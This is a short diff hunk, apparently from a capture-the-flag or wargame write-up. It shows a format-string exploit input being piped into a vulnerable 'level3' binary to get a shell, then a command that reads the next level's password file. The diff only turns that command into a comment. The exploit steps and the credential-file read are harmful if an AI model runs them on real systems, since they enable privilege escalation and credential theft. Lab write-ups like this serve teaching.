@@ -34,4 +34,4 @@ INPUT="${PRINTF_ADDRESS}${PRINTF_VALUE_FILLER}${PRINTF_WRITER}"
 (echo "${INPUT}" && cat) | ./level3
 
 # We use the reverse shell to retrieve the password
-$ cat /home/user/level4/.pass
+# $> cat /home/user/level4/.pass
